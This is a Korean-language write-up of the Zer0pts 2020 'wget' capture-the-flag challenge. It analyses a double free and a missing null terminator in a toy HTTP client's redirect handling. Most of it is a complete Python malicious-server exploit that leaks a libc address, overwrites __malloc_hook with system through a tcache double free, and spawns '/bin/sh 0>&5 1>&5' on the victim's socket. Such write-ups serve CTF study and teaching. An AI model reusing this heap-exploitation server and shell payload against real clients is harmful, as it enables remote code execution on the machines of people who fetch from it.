# Zer0pts 2020 wget writeup
##  1. 취약점 분석
아래는 oget.c 에서 가장 핵심적인 부분인 download_file 함수이다. 이 함수를 이용해 공격 서버를 구성하고 익스플로잇을 수행할 것이다.
```c++
char * download_file(char * host, char * port, char * path) {
    int sock;
    unsigned long length;
    struct addrinfo server, * res;
    struct in_addr addr;
    char * key, * value;
    char * request, * response, * html, * redirect;

    request = response = html = redirect = NULL;

    /* establish connection */
    memset( & server, 0, sizeof(server));
    server.ai_socktype = SOCK_STREAM;
    server.ai_family = AF_INET;
    if (getaddrinfo(host, port, & server, & res) != 0) {
        fatal("Could not resolve hostname");
    }

    if ((sock = socket(res - > ai_family, res - > ai_socktype, res - > ai_protocol)) < 0) {
        fatal("Could not create socket");
    }

    if (connect(sock, res - > ai_addr, res - > ai_addrlen) != 0) {
        fatal("Could not connect to host");
    }

    /* send HTTP request */
    request = malloc(SIZE_HEADER + strlen(path) + strlen(host) + 1);
    sprintf(request, "GET /%s HTTP/1.1\r\nHost: %s:%s\r\n\r\n", path, host, port);
    write(sock, request, strlen(request));

    /* receive HTTP response */
    response = malloc(SIZE_RESPONSE);
    while (1) {
        if (readline(sock, response, SIZE_RESPONSE)) {
            /* Skip too long request */
            continue;
        }

        if ( * response == '\0') {
            /* end of response headers */
            break;
        }

        /* parse response header */
        parse_response(response, & key, & value);
        if (key == NULL || value == NULL) {
            continue;
        }

        if (strcmp(key, "location") == 0) {
            /* validate URL */
            if (!validate_url(value) || value[0] == '/') {
                /* follow redirects */
                redirect = malloc(strlen(value) + 1);
                memcpy(redirect, value, strlen(value));

                /* no longer need html */
                if (html) free(html);
            } else {
                /* location value is neither URL nor path */
                fatal("Redirected URL must start with 'http://' or '/'");
            }
        } else if (strcmp(key, "content-length") == 0) {
            /* allocate buffer for html */
            length = atol(value);
            html = malloc(length + 1);
            if (html == NULL) fatal("Memory error");
        }
    }

    free(request);
    free(response);

    if (redirect) {
        /* support for omitted hostname */
        if (redirect[0] == '/') {
            char * t = malloc(SIZE_HOST + strlen(host) + strlen(redirect) + 1);
            sprintf(t, "http://%s:%s%s", host, port, redirect);
            free(redirect);
            redirect = t;
        }

        /* redirect to the new URL and return it's HTML */
        close(sock);
        return omega_get(redirect);

    } else {
        /* read HTML */
        if (html && length > 0) {
            if (read(sock, html, length) == 0) {
                fatal("Connection closed");
            }
        } else {
            fatal("Empty response");
        }

        close(sock);
        return html;
    }
}
```
루프에서는 서버로부터 응답을 한 줄 씩("\r\n" 으로 구분함) 읽어
* **"\0"** 으로 시작하는 경우 루프를 빠져나온다
* **KEY: VALUE** 의 구조가 아닌 줄은 건너 뛴다.
* **KEY**가 **"location"** 이고  **value**가 **/** 로 시작하거나 **valid url**인 경우 리다이렉트를 처리한다.
* **content-length** 가 지정된 경우 **html** 에 **value + 1** 크기의 버퍼를 생성한다.

이 부분에서 취약점이 두 개 발견된다. 첫 번째는, 서버의 응답이 **location** 을 여러 번 포함할 경우 이 부분이 여러 번 불리면서 **html** 변수를 반복해 **free** 하는 것이다. **free** 를 하고 나서 **html** 을 0으로 초기화하지 않으므로 **html** 에는 이미 **free**된 주소가 남아있고, 이 것을 다시 한번 **free**할 경우 **double free bug** 가 발생한다. 이 프로그램은 **libc 2.27** 을 사용하므로 **tcache** 를 사용하고, 따라서 **tcache** 사이즈 이내에서 더블 프리에 아무런 문제가 없다.

두 번째 취약점은, 아래 코드에 있다.
```c++
redirect = malloc(strlen(value) + 1);
memcpy(redirect, value, strlen(value));
```
이것이 왜 취약점인지 잘 연상이 안 될 수도 있지만, **memcpy** 로 문자열을 복사하는 데 주목하자. **strlen(value)** 크기만을 복사하게 되면 문자열 끝에 있는 **널바이트**가 **redirect**에는 빠지게 된다. 따라서 이 부분을 잘 활용하면 릭을 낼 수 있다.

 취약점과 별개로 한 가지 중요한 것은, **content-length** 키를 전송하면 임의 사이즈의 청크를 할당할 수 있다는 것이다. 또한, **location** 에서 전송된 **value** 의 길이만큼의 공간을 **malloc ** 하고, 그 곳에 내용을 쓸 수 있다는 것이다. 이것을 이용해 공격 서버를 프로그래밍 할 수 있다.

하지만, 아직 한 가지 문제가 있는데, 서버로 프로그램의 libc 주소를 알려줄 **leak** 을 보내야 한다는 것이다. 따라서, 취약점 하나를 더 찾아보자. 여기서는 서버에 데이터를 전송하는 유일한 코드인
```c++
request = malloc(SIZE_HEADER + strlen(path) + strlen(host) + 1);
sprintf(request, "GET /%s HTTP/1.1\r\nHost: %s:%s\r\n\r\n", path, host, port);
write(sock, request, strlen(request));
```
이 부분에 주목할 것이다.

코드의 뒷부분을 좀 더 살펴보자
```c++
if (redirect) {
    /* support for omitted hostname */
    if (redirect[0] == '/') {
        char *t = malloc(SIZE_HOST + strlen(host) + strlen(redirect) + 1);
        sprintf(t, "http://%s:%s%s", host, port, redirect);
        free(redirect);
        redirect = t;
    }
/* redirect to the new URL and return it's HTML */
close(sock);
return omega_get(redirect);
```
이 부분에서 **redirect** 가 할당되어 있는 경우 재귀호출을 통해 리다이렉션을 수행한다. 여기서 앞서 살펴 본 바에 따르면, **location** 에 **http://** 로 시작하는 url이나 **/** 로 시작하는 문자열을 보내면 그 뒤에 널 바이트가 붙지 않아 발생한 릭이 url에 붙게 된다. 익스플로잇에서는 하나의 공격 서버만 사용할 것이므로 모두 **/** 로 시작하는 리다이렉션 주소를 보낼 것이다. 그러면, **omega_get** 에서 다시 불린 **download_file** 함수에 릭이 포함된 **path** 가 들어가고, 
```c++
request = malloc(SIZE_HEADER + strlen(path) + strlen(host) + 1);
sprintf(request, "GET /%s HTTP/1.1\r\nHost: %s:%s\r\n\r\n", path, host, port);
write(sock, request, strlen(request));
```
이 부분에 의해 **path** 가 서버로 전송되면서 서버는 프로그램의 릭을 획득할 수 있다.

## 2. Actual Exploit
다음은 *server.py* 코드이다.
```python
#/usr/bin/env !python3

import socket
from pwn import *

payload1 = b'content-length: 255\r\nlocation: /xxxxxxx\r\nlocation: /xxxxxxx\r\nlocation: /xxxxxxx\r\nlocation: /xxxxxxx\r\nlocation: /xxxxxxx\r\nlocation: /xxxxxxx\r\nlocation: /xxxxxxx\r\nlocation: /xxxxxxx\r\n' + \
			b'content-length: 100\r\nlocation: ///xxxxx\r\n' + b'\0\r\n'

catflag = b';' * 0x1e0 + b'cat flag;'

payload2 = b'content-length: 511\r\nlocation: /1\r\nlocation: /1\r\nlocation: /1\r\n\0\r\n'

payload3 = b'content-length: 15\r\ncontent-length: 15\r\n' + (b'location: /11' + catflag + b'\r\n') * 4 + b'\r\n\0\r\n'

payload4_f = b'content-length: 411\r\n'

payload4_b = b'\r\n\0\r\n'

payload4 = b''

payload5 = b'content-length: 15\r\n' + (b'location: /11' + catflag + b'\r\n') * 4 + b'\r\n\0\r\n'

leak = 0
free_hook = 0
system = 0

# serrver function
def run_server(host="127.0.0.1", port=4000):
	add_flag = 0 # phase
	g_con = None # global connection
	with socket.socket() as s:
		s.bind((host, port))
		s.listen(5) # listen
		while True:
			conn, addr = s.accept()
			g_con = conn

			msg = conn.recv(1024) # get request from wget client
			print("requset size : " + str(len(msg)))
			print(msg) # print request

			if b'/xx' in msg: # phase 2 : get leak
				leak = u64(msg[12:18] + b'\0\0')
				print("LEAK : " + hex(leak))
				malloc_hook = leak - 0x7ffff7dcfca0 + 0x7ffff7dcfc30 - 1
				system = leak - 0x7ffff7dcfca0 + 0x7ffff7a33440
				print(payload2)
				conn.sendall(payload2)
			elif b'/ ' in  msg: # phase 1 : make leak
				print("MAKING LEAK")
				conn.sendall(payload1)
			elif b'/11' in msg: # phase 4 : arbitry writing

				if add_flag != 0: # write __malloc_hook
					payload4 = payload4_f + b'location: ' + p64((malloc_hook & 0xffffffffffffff00) | 0x2f) + b'\r\nlocation: /1\r\n' + b'location: /' + p64(system) + b'\r\ncontent-length: ' + str(((malloc_hook & 0xffffffffffffff00) | 0x2f) + 0x1300).encode() + payload4_b
					add_flag = 2 # attack ends

				else: # write "/bin/sh 0>&5 1>&5" remote shell command
					payload4 = payload4_f + b'location: ' + p64(((malloc_hook & 0xffffffffffffff00) | 0x2f) + 0x1300) + b'\r\nlocation: /1\r\n' + \
						b'location: /\n/bin/sh 0>&5 1>&5\r\nlocation: /;' + b';' * 130 + payload4_b
					add_flag = 1 # command prepared

				print(payload4)
				conn.sendall(payload4)

				if add_flag ==2: # attacking loop ends
					break

			elif b'/;' in msg: # tcache double free : size 0x20 again
				print("Erm...")
				conn.sendall(payload5)

			elif b'/@' in msg: # unused
				conn.sendall(b'content-length: 10\r\n\0\r\naaaa')

			elif b'/1' in msg: # tcache double free : size 0x20
				conn.sendall(payload3)

			else: # unused
				conn.sendall(b'content-length: ' + str(system).encode() + b'\r\n\0\r\n!CONTENT!')
				# fianl

		while True: #interactive mode
			# ls -al
			# cat woa_u_got_flag.txt 0>&5 1>&5
			g_con.sendall(input())
			msg = g_con.recv(1024)
			print(msg.decode())
		conn.close()

if __name__ == '__main__':
	p = 9092
	while True:
		try:
			print(p)
			run_server('', p)
			break
		except KeyboardInterrupt:
			break
		except:
			p += 1
```
익스플로잇의 흐름은 앞서 살펴봤듯, 릭의 획득과 원격 쉘의 획득 두 가지 과정으로 나뉜다. 실제 익스플로잇에서 사용된 주목할 만 한 사항은 아래와 같다.
* 1. **tcache**에 들어가는 조금 큰 사이즈 청크를 8번 free해 **libc main arena** 의 주소가 청크에 적히게 한다.
* 2. 해당 청크에 **location** 으로 8바이트 문자열("/xxxxxxx") 을 할당시킨다. 그러면 청크의 8바이트 뒤의  **libc main arena** 가 손상을 받지 않고 다음 번 리퀘스트에 같이 딸려나오게 된다.
* 3. double free 를 이용해 arbitary write를 수행한다. 이 때, 청크에 내용을 쓰기 위해서는 **loction** 을 이용해야 하는데, **location** 의 첫 바이트는 반드시 **/** 이어야 한다. 따라서 arbitary write 의 대상이 되는 주소의 가장 낮은 바이트는 0x2f 이어야만 하고, 이것과 가장 가까운, 가장 낮은 바이트가 0x30인 **__malloc_hook**을 **system**으로 덮는다.
* 4. 그 전에, 실행할 명령어가 적힌 청크 역시 libc 의 쓰기 가능 영역에 임의로 할당한다.
* 5. 명령어가 적힌 주소 사이즈의 청크를 **malloc** 해 해당 명령어를 부른다.


주의해야 할 점은, 프로그램과 서버는 **interactive** 하지 않다는 것이다. 따라서 서버와 이미 열려있는 소켓에 쉘을 바인딩 해주어야 정상적으로 명령어를 실행하고 그 결과를 볼 수 있다. 서버에 열려 있는 소켓 fd는 3부터 시작해서 찍어 본 결과 5로 확인되었다.

    zer0pts{w0w_u_m4d3_17_1nt3r4ct1v3}
